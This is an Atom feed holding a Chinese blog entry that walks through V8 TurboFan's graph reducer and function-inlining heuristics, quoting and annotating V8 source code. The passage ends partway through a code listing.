<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>P1umerのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p1umer.gituhb.io/"/>
  <updated>2019-07-04T16:22:16.227Z</updated>
  <id>http://p1umer.gituhb.io/</id>
  
  <author>
    <name>P1umer sauce</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>V8 Optimize: Reduce Node &amp;&amp; Inline</title>
    <link href="http://p1umer.gituhb.io/2019/07/04/V8-Optimize-Reduce-Node-Inline/"/>
    <id>http://p1umer.gituhb.io/2019/07/04/V8-Optimize-Reduce-Node-Inline/</id>
    <published>2019-07-04T12:47:23.000Z</published>
    <updated>2019-07-04T16:22:16.227Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-analsis-of-turbofan-reducenode-ampamp-inline">Intro: Analsis of Turbofan ReduceNode &amp;&amp; Inline</span></h2><a id="more"></a><h2><span id="reduce-node-analysis">Reduce-node Analysis</span></h2><ol><li><p>初始化GraphReducer</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//graph-reducer.cc:28</span><br><span class="line"></span><br><span class="line">GraphReducer::GraphReducer(...)&#123;...&#125;</span><br></pre></td></tr></table></figure></li><li><p>添加reducer器,通过栈结构实现</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//graph-reducer.cc:43</span><br><span class="line"></span><br><span class="line">void GraphReducer::AddReducer(Reducer* reducer) &#123;</span><br><span class="line">  reducers_.push_back(reducer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ReduceGraph 入口–Backward DFS</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//graph-reducer.cc:78</span><br><span class="line"></span><br><span class="line">void GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;</span><br></pre></td></tr></table></figure></li><li><p>ReduceNode 主逻辑</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//graph-reducer.cc:48</span><br><span class="line"></span><br><span class="line">void GraphReducer::ReduceNode(Node* node) &#123;</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  Push(node);</span><br><span class="line">  for (;;) &#123;</span><br><span class="line">    if (!stack_.empty()) &#123;</span><br><span class="line">      // Process the node on the top of the stack, potentially pushing more or</span><br><span class="line">      // popping the node off the stack.</span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; else if (!revisit_.empty()) &#123;</span><br><span class="line">      // If the stack becomes empty, revisit any nodes in the revisit queue.</span><br><span class="line">      Node* const node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      if (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        // state can change while in queue.</span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // Run all finalizers.</span><br><span class="line">      for (Reducer* const reducer : reducers_) reducer-&gt;Finalize();</span><br><span class="line"></span><br><span class="line">      // Check if we have new nodes to revisit.</span><br><span class="line">      if (revisit_.empty()) break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>进入 Reduce Top，紧接着进入 Reduce</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//graph-reducer.cc:82</span><br><span class="line"></span><br><span class="line">Reduction GraphReducer::Reduce(Node* const node) &#123;</span><br><span class="line">  auto skip = reducers_.end();</span><br><span class="line">  for (auto i = reducers_.begin(); i != reducers_.end();) &#123;</span><br><span class="line">    if (i != skip) &#123;</span><br><span class="line">      // 针对传入的 Node 进行 Reducers 的遍历优化</span><br><span class="line">      Reduction reduction = (*i)-&gt;Reduce(node);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>进入特定 pass 的Reduce 过程，例如 DeadCodeElimination：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//dead-code-elimination.cc:48</span><br><span class="line"></span><br><span class="line">Reduction DeadCodeElimination::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  switch (node-&gt;opcode()) &#123;</span><br><span class="line">    case IrOpcode::kEnd:</span><br><span class="line">      return ReduceEnd(node);</span><br><span class="line">     ...</span><br><span class="line">  &#125;</span><br><span class="line">  UNREACHABLE();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>【+】 stack 是实现 backward DFS 的基本栈结构，Reducer为栈式自动机</p><p>【+】 revisit 是需要重复 reduce 的 node 列表，通常是reduced 节点的 use</p><p>【+】 Reduce Top 实现具体的 Node Reduce；接着循环遍历各 pass 的 Reducer。调用层次:</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190701182425.png" alt></p><h2><span id="reduce-node-algorithm">Reduce-node Algorithm</span></h2><p>【+】<a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc" target="_blank" rel="noopener">TurboFan JIT Design</a></p><ol><li>使用栈结构的递归<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190704220244.png" alt><ul><li>根节点为 graph-&gt;end()</li><li>从下向上 reduce</li></ul></li><li>如果节点之间存在循环调用，比如：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190701085650.png" alt>则：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190701134958.png" alt>因此在Reduce n3 结束时：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190701135141.png" alt>重新Reduce n6(n3-&gt;use=n6,push n6)<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190701135344.png" alt><ul><li>需要维护一个 revisit 栈</li><li>行为：A 节点优化完成后将 A 的 use 节点 push stack</li></ul></li></ol><h2><span id="jsinline">JSInline</span></h2><p>当为一个函数A生成优化代码的时候，Turbofan 可以为 A 函数中调用的其他函数进行 Inline。但是仅仅内联用户的代码是远远不够的，编译器还需要对 buildin 函数进行内联，buildin的内联和常规的内联是分开处理的。</p><h3><span id="general-inline">General Inline</span></h3><p>JSInliner 类描述了常规内联的行为，它有一个前驱 JSInliningHeuristic 用来决定内联策略。核心的内联器其实很简单：它针对 JSCallFunction 和 JSCallConstruct 进行处理，用 BytecodeGraphBuilder 根据 Interpreter 生成的 Bytecode 为 callee 直接生成一个子图，最终将 Call 节点替换为该子图。内联既可以内联一个callee，也可以多态内联，内联多个 callee 的 phi。</p><h4><span id="多态-inline">多态 Inline</span></h4><p>基本的逻辑和单态差不多，但是需要处理多个目标，而且再决定内联某个多态节点时候，我们需要准确的分离出我们要 inline 的 target。heuristic目前只考虑所有节点都已经知道的多态，例如callee为phi类型而且接受的输入为指向 JSFunctions 的 HeapConstant。而且，至少有一个 candidate 会被选中进行 Inline。</p><p>所以当 heuristics 让我们去Inline一个多态节点的时候，我们第一步要做的就是拓展JSCallFunction/JSCallConstruct 为众多单节点 call 的子图，然后对每一个单独分离完毕的 target 进行单态 Inline 。<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190704201211.png" alt><br>核心的代码在 <a href="https://sourcegraph.com/github.com/v8/v8@4b9b23521e6fd42373ebbcb20ebe03bf445494f9/-/blob/src/compiler/js-inlining-heuristic.cc#L549" target="_blank" rel="noopener">JSInliningHeuristic::CreateOrReuseDispatch( js-inlining-heuristic.cc#L549 )</a></p><h3><span id="builtin-inlining">Builtin Inlining</span></h3><p>Builtin 的 Inline 和上面讲述的 General Inline 有些许不同，原因有下:</p><ul><li>首先 Builtin 函数没有字节码，Turbofan 直接 Call Stub。</li><li>其次，若非一个内联是有类似于没有 check 的 fast 途径，内联不如直接 Call Stub 来的快。</li></ul><h4><span id="inline-策略">Inline 策略</span></h4><p>TurboFan 将会在两个地方进行 Builtin 的内联:</p><ul><li>inlining/native context specialization pass: JSCallReducer</li><li>typed lowering pass: JSBuiltinReducer<br>从 pass 运行的先后就可以得到: JSBuiltinReducer 处理的 Inline 必须在 Type Pass 后面，也就是需要采集 Type Information；JSCallReducer 处理的则稍早，处理一些类型严格的 Builtin 比如 Array.prototype.map。</li></ul><h3><span id="builtin-inlining">Builtin Inlining</span></h3><h2><span id="jsinliningheuristic">JSInliningHeuristic</span></h2><p>现讨论单个 pass：JSInliningHeuristic的 Reduce 过程</p><p>调用堆栈：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190702004139.png" alt></p><h3><span id="jsinliningheuristicreduce">JSInliningHeuristic::Reduce</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">//js-inlining-heuristic.cc:89</span><br><span class="line"></span><br><span class="line">Reduction JSInliningHeuristic::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccessIf no_heap_acess(FLAG_concurrent_inlining);</span><br><span class="line"></span><br><span class="line">  //检查是否是可以被 inline 的 Opcode</span><br><span class="line">  if (!IrOpcode::IsInlineeOpcode(node-&gt;opcode())) return NoChange();</span><br><span class="line"></span><br><span class="line">  //检查是否 inline 过该节点</span><br><span class="line">  // Check if we already saw that &#123;node&#125; before, and if so, just skip it.</span><br><span class="line">  if (seen_.find(node-&gt;id()) != seen_.end()) return NoChange();</span><br><span class="line">  seen_.insert(node-&gt;id());</span><br><span class="line"></span><br><span class="line">  //检查该节点是否可以被加入inline列表，判断是否可以当作candidate</span><br><span class="line">  // Check if the &#123;node&#125; is an appropriate candidate for inlining.</span><br><span class="line">  Candidate candidate = CollectFunctions(node, kMaxCallPolymorphism);</span><br><span class="line">  if (candidate.num_functions == 0) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125; else if (candidate.num_functions &gt; 1 &amp;&amp; !FLAG_polymorphic_inlining) &#123;</span><br><span class="line">    TRACE(</span><br><span class="line">        &quot;Not considering call site #%d:%s, because polymorphic inlining &quot;</span><br><span class="line">        &quot;is disabled\n&quot;,</span><br><span class="line">        node-&gt;id(), node-&gt;op()-&gt;mnemonic());</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bool can_inline = false, force_inline_small = true;</span><br><span class="line">  candidate.total_size = 0;</span><br><span class="line">  </span><br><span class="line">  //获取node的framestate</span><br><span class="line">  Node* frame_state = NodeProperties::GetFrameStateInput(node);</span><br><span class="line">  FrameStateInfo const&amp; frame_info = FrameStateInfoOf(frame_state-&gt;op());</span><br><span class="line">  Handle&lt;SharedFunctionInfo&gt; frame_shared_info;</span><br><span class="line">  </span><br><span class="line">  //一般只有一个 num_functions</span><br><span class="line">  for (int i = 0; i &lt; candidate.num_functions; ++i) &#123;</span><br><span class="line">    if (!candidate.bytecode[i].has_value()) &#123;</span><br><span class="line">      // We&apos;re already missing critical data which wouldn&apos;t allow us to</span><br><span class="line">      // continue the inlining checks. Log a warning and continue.</span><br><span class="line">      if (candidate.functions[i].has_value()) &#123;</span><br><span class="line">        TRACE_BROKER(broker(),</span><br><span class="line">                     &quot;Missing bytecode array trying to inline JSFunction &quot;</span><br><span class="line">                         &lt;&lt; *candidate.functions[i]);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        TRACE_BROKER(</span><br><span class="line">            broker(),</span><br><span class="line">            &quot;Missing bytecode array trying to inline SharedFunctionInfo &quot;</span><br><span class="line">                &lt;&lt; *candidate.shared_info);</span><br><span class="line">      &#125;</span><br><span class="line">      // Those functions that don&apos;t have their bytecode serialized probably</span><br><span class="line">      // don&apos;t have the SFI either, so we exit the loop early.</span><br><span class="line">      candidate.can_inline_function[i] = false;</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SharedFunctionInfoRef shared = candidate.functions[i].has_value()</span><br><span class="line">                                       ? candidate.functions[i].value().shared()</span><br><span class="line">                                       : candidate.shared_info.value();</span><br><span class="line">    candidate.can_inline_function[i] = shared.IsInlineable();</span><br><span class="line">    // Do not allow direct recursion i.e. f() -&gt; f(). We still allow indirect</span><br><span class="line">    // recurion like f() -&gt; g() -&gt; f(). The indirect recursion is helpful in</span><br><span class="line">    // cases where f() is a small dispatch function that calls the appropriate</span><br><span class="line">    // function. In the case of direct recursion, we only have some static</span><br><span class="line">    // information for the first level of inlining and it may not be that useful</span><br><span class="line">    // to just inline one level in recursive calls. In some cases like tail</span><br><span class="line">    // recursion we may benefit from recursive inlining, if we have additional</span><br><span class="line">    // analysis that converts them to iterative implementations. Though it is</span><br><span class="line">    // not obvious if such an anlysis is needed.</span><br><span class="line">    if (frame_info.shared_info().ToHandle(&amp;frame_shared_info) &amp;&amp;</span><br><span class="line">        frame_shared_info.equals(shared.object())) &#123;</span><br><span class="line">      TRACE(&quot;Not considering call site #%d:%s, because of recursive inlining\n&quot;,</span><br><span class="line">            node-&gt;id(), node-&gt;op()-&gt;mnemonic());</span><br><span class="line">      candidate.can_inline_function[i] = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // A function reaching this point should always have its bytecode</span><br><span class="line">    // serialized.</span><br><span class="line">    BytecodeArrayRef bytecode = candidate.bytecode[i].value();</span><br><span class="line">    if (candidate.can_inline_function[i]) &#123;</span><br><span class="line">      can_inline = true;</span><br><span class="line">      candidate.total_size += bytecode.length();</span><br><span class="line">    &#125;</span><br><span class="line">    // We don&apos;t force inline small functions if any of them is not inlineable.</span><br><span class="line">    if (!IsSmallInlineFunction(bytecode)) &#123;</span><br><span class="line">      force_inline_small = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if (!can_inline) return NoChange();</span><br><span class="line"></span><br><span class="line">  // Gather feedback on how often this call site has been hit before.</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kJSCall) &#123;</span><br><span class="line">    CallParameters const p = CallParametersOf(node-&gt;op());</span><br><span class="line">    candidate.frequency = p.frequency();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    ConstructParameters const p = ConstructParametersOf(node-&gt;op());</span><br><span class="line">    candidate.frequency = p.frequency();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Handling of special inlining modes right away:</span><br><span class="line">  //  - For restricted inlining: stop all handling at this point.</span><br><span class="line">  //  - For stressing inlining: immediately handle all functions.</span><br><span class="line">  switch (mode_) &#123;</span><br><span class="line">    case kRestrictedInlining:</span><br><span class="line">      return NoChange();</span><br><span class="line">    case kStressInlining:</span><br><span class="line">      //我们需要关注 InlineCandidate，接下来会分析</span><br><span class="line">      return InlineCandidate(candidate, false);</span><br><span class="line">    case kGeneralInlining:</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // 执行次数大于 FLAG_min_inlining_frequency 才会对该节点inline</span><br><span class="line">  // Don&apos;t consider a &#123;candidate&#125; whose frequency is below the</span><br><span class="line">  // threshold, i.e. a call site that is only hit once every N</span><br><span class="line">  // invocations of the caller.</span><br><span class="line">  if (candidate.frequency.IsKnown() &amp;&amp;</span><br><span class="line">      candidate.frequency.value() &lt; FLAG_min_inlining_frequency) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // candidate 的 bytecode 长度同样也会决定是否 inline</span><br><span class="line">  // Forcibly inline small functions here. In the case of polymorphic inlining</span><br><span class="line">  // force_inline_small is set only when all functions are small.</span><br><span class="line">  if (force_inline_small &amp;&amp;</span><br><span class="line">      cumulative_count_ &lt; FLAG_max_inlined_bytecode_size_absolute) &#123;</span><br><span class="line">    TRACE(&quot;Inlining small function(s) at call site #%d:%s\n&quot;, node-&gt;id(),</span><br><span class="line">          node-&gt;op()-&gt;mnemonic());</span><br><span class="line">    return InlineCandidate(candidate, true);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // In the general case we remember the candidate for later.</span><br><span class="line">  candidates_.insert(candidate);</span><br><span class="line">  return NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="jsinliningheuristiccollectfunctions">JSInliningHeuristic::CollectFunctions</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">//js-inlining-heuristic.cc:35</span><br><span class="line"></span><br><span class="line">JSInliningHeuristic::Candidate JSInliningHeuristic::CollectFunctions(</span><br><span class="line">    Node* node, int functions_size) &#123;</span><br><span class="line">  DCHECK_NE(0, functions_size);</span><br><span class="line">  Node* callee = node-&gt;InputAt(0);</span><br><span class="line">  Candidate out;</span><br><span class="line">  out.node = node;</span><br><span class="line"></span><br><span class="line">  //callee包含了函数名称等信息</span><br><span class="line">  HeapObjectMatcher m(callee);</span><br><span class="line">  if (m.HasValue() &amp;&amp; m.Ref(broker()).IsJSFunction()) &#123;</span><br><span class="line">    //视为 JSFunction</span><br><span class="line">    out.functions[0] = m.Ref(broker()).AsJSFunction();</span><br><span class="line">    JSFunctionRef function = out.functions[0].value();</span><br><span class="line">    if (function.IsSerializedForCompilation()) &#123;</span><br><span class="line">      out.bytecode[0] = function.shared().GetBytecodeArray();</span><br><span class="line">    &#125;</span><br><span class="line">    out.num_functions = 1;</span><br><span class="line">    return out;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  //callee 是合并 ValueInputCount 个 possible callee 的 phi 节点</span><br><span class="line">  if (m.IsPhi()) &#123;</span><br><span class="line">    int const value_input_count = m.node()-&gt;op()-&gt;ValueInputCount();</span><br><span class="line">    if (value_input_count &gt; functions_size) &#123;</span><br><span class="line">      out.num_functions = 0;</span><br><span class="line">      return out;</span><br><span class="line">    &#125;</span><br><span class="line">    for (int n = 0; n &lt; value_input_count; ++n) &#123;</span><br><span class="line">      HeapObjectMatcher m(callee-&gt;InputAt(n));</span><br><span class="line">      if (!m.HasValue() || !m.Ref(broker()).IsJSFunction()) &#123;</span><br><span class="line">        out.num_functions = 0;</span><br><span class="line">        return out;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      out.functions[n] = m.Ref(broker()).AsJSFunction();</span><br><span class="line">      JSFunctionRef function = out.functions[n].value();</span><br><span class="line">      if (function.IsSerializedForCompilation()) &#123;</span><br><span class="line">        out.bytecode[n] = function.shared().GetBytecodeArray();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    out.num_functions = value_input_count;</span><br><span class="line">    return out;</span><br><span class="line">  &#125;</span><br><span class="line">  if (m.IsJSCreateClosure()) &#123;</span><br><span class="line">    CreateClosureParameters const&amp; p = CreateClosureParametersOf(m.op());</span><br><span class="line">    DCHECK(!out.functions[0].has_value());</span><br><span class="line">    out.shared_info = SharedFunctionInfoRef(broker(), p.shared_info());</span><br><span class="line">    SharedFunctionInfoRef shared_info = out.shared_info.value();</span><br><span class="line">    if (shared_info.HasBytecodeArray()) &#123;</span><br><span class="line">      out.bytecode[0] = shared_info.GetBytecodeArray();</span><br><span class="line">    &#125;</span><br><span class="line">    out.num_functions = 1;</span><br><span class="line">    return out;</span><br><span class="line">  &#125;</span><br><span class="line">  out.num_functions = 0;</span><br><span class="line">  return out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="sharedfunctioninfogetbytecodearray">SharedFunctionInfo::GetBytecodeArray</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BytecodeArray SharedFunctionInfo::GetBytecodeArray() const &#123;</span><br><span class="line">  DCHECK(HasBytecodeArray());</span><br><span class="line">  if (HasDebugInfo() &amp;&amp; GetDebugInfo().HasInstrumentedBytecodeArray()) &#123;</span><br><span class="line">    return GetDebugInfo().OriginalBytecodeArray();</span><br><span class="line">  &#125; else if (function_data().IsBytecodeArray()) &#123;</span><br><span class="line">    return BytecodeArray::cast(function_data());</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    DCHECK(function_data().IsInterpreterData());</span><br><span class="line">    </span><br><span class="line">    //返回interpreter数据</span><br><span class="line">    return InterpreterData::cast(function_data()).bytecode_array();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="jsinliningheuristicinlinecandidate">JSInliningHeuristic::InlineCandidate</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">//js-inlining-heuristic.cc:628</span><br><span class="line"></span><br><span class="line">Reduction JSInliningHeuristic::InlineCandidate(Candidate const&amp; candidate,</span><br><span class="line">                                               bool small_function) &#123;</span><br><span class="line">  int const num_calls = candidate.num_functions;</span><br><span class="line">  Node* const node = candidate.node;</span><br><span class="line">  </span><br><span class="line">  //只有一个function需要内联</span><br><span class="line">  if (num_calls == 1) &#123;</span><br><span class="line">    //内联 JSCall 的 callee，接下来会分析</span><br><span class="line">    Reduction const reduction = inliner_.ReduceJSCall(node);</span><br><span class="line">    if (reduction.Changed()) &#123;</span><br><span class="line">      cumulative_count_ += candidate.bytecode[0].value().length();</span><br><span class="line">    &#125;</span><br><span class="line">    return reduction;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  //num_calls&gt;1</span><br><span class="line">  // Expand the JSCall/JSConstruct node to a subgraph first if</span><br><span class="line">  // we have multiple known target functions.</span><br><span class="line">  DCHECK_LT(1, num_calls);</span><br><span class="line">  Node* 